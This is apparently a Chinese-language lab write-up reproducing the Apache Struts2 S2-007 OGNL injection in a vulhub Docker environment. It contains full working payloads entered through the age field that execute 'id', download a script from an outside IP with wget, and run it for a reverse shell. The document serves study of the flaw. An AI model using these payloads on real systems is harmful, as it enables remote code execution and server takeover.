ailx10说：这篇是2024年9月之前写的，后来又改过。这次轮到 S2-007，入口落在一个看起来很普通的 age 字段上。输入类型不合适以后，页面处理错误值时又碰到了表达式，我顺着这个过程继续试执行、下载脚本和连接。它跟前几篇最有意思的区别，就是问题不在“用户填了什么名字”，而在校验失败后程序怎样把值带回来。笔记主要留的是这条路径，方便以后对照别的 S2 编号；同样叫 OGNL 注入，也得先找清触发点，不能拿一套载荷四处硬套。

---

原实验通过 age 输入导致类型转换错误，观察到错误处理和表达式求值；适用版本应核对官方公告。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

实验结束后在确认项目目录和 Compose 配置后关闭本项目服务；原文中的全局 Docker 清理命令已移除。

简单访问一下，说明 S2-007 远程代码执行漏洞 环境搭建成功了

![](/notes-assets/443747b1d2d2b8abd3ee.webp)

（1）命令执行，在`age`字段中输入，可以看到`id`命令执行成功了

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```

![](/notes-assets/3eb2514ab33e806b1ca6.webp)

- `#_memberAccess["allowStaticMethodAccess"]=true` 设置可以调用任意的静态方法
- `#foo=new java.lang.Boolean("false")`创建一个`Boolean`类型的对象`#foo`，值为`false`
- `#context["xwork.MethodAccessor.denyMethodExecution"]=#foo` 设置允许执行任何方法
- `@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())` 执行系统命令，获取命令执行后的结果，输出到响应内容中

（2）命令执行，文件下载，这里使用Burp，小技巧，选中，改变编码

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('wget 144.34.162.13/10.sh').getInputStream())) + '
```

![](/notes-assets/8b8378a50c5d9461a8c1.webp)

进入docker查看，`10.sh`下载成功

（3）命令执行，执行`10.sh`，反弹shell

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('bash 10.sh').getInputStream())) + '
```

![](/notes-assets/f7ae47a51e7a15c7ea85.webp)

（4）见证反弹shell成功

![](/notes-assets/cdce1952c74bcec3105d.webp)

版本与修复信息可查阅 [Apache Struts 安全公告](https://cwiki.apache.org/confluence/spaces/WW/pages/61758/Security%2BBulletins)。

输入不符合预期时，程序仍然会继续做一些事情。把失败分支和正常分支一样认真地读一遍，往往能发现只盯成功流程时看不到的入口。
